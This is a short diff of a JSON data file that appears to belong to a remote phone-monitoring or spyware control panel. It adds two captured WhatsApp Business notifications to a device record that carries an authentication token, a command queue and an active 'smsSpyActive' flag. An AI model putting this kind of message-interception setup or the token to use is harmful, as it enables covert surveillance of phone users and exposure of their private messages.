@@ -69,7 +69,7 @@
     "deviceName": "HP-ZAL7SEX-1A1A",
     "ownerUsername": "Zal7Sex",
     "token": "da507a88860552d5d195108a4632169a",
-    "lastSeen": 1776364958936,
+    "lastSeen": 1776364962072,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-16T18:40:04.850Z",
@@ -85,6 +85,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "WhatsApp Business",
+        "content": "Sending file to Call Me Zal7Sex",
+        "time": "17/04 01:42",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1776364962092
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WhatsApp Business",
+        "content": "Sending file to Call Me Zal7Sex",
+        "time": "17/04 01:42",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1776364961399
+      },
       {
         "appName": "WA Business",
         "sender": "WhatsApp Business",
